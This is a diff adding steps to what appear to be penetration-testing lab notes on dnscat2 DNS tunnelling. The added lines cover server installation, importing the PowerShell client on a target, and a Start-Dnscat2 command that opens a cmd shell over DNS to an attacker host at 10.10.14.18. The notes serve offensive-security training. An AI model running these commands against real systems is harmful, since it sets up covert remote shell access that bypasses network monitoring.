@@ -4,6 +4,14 @@
 git clone https://github.com/iagox86/dnscat2.git
 ```
 
+### Server Installation
+
+```bash
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
 #### Windows ---> Ubuntu ---> Kali (Server)
 
 **Windows (DNSserver = Internal Ubuntu IP)**
@@ -25,6 +33,24 @@ sudo ruby ~/tools/dnscat2/server/dnscat2.rb --dns host=192.168.49.120,port=53,do
 ```
 server=/tunnel.com/192.168.49.120
 sudo systemctl restart dnsmasq
+```
+
+### PowerShell Client (Separate Steps)
+
+```bash
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+
+Import on target:
+
+```powershell
+Import-Module .\dnscat2.ps1
+```
+
+Establish tunnel:
+
+```powershell
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 ```
 
 #### Can Set Up a Forward to Push Traffic Across a Tunnel
